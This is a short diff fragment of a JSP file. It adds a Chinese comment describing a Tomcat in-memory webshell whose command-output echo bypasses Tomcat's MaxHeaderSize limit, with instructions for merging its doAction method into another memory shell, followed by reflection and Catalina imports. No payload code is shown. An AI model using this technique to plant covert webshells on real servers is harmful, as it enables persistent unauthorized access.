@@ -1,3 +1,5 @@
+//绕过回显受Tomcat MaxHeaderSize限制的内存马。可以直接复制final StringBuilder result = new StringBuilder();以及doAction方法到原本的内存马类中，然后在内存马执行代码的逻辑里面（如Servlet#service）直接调用doAction。
+
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
 <%@ page import="org.apache.catalina.connector.Request" %>
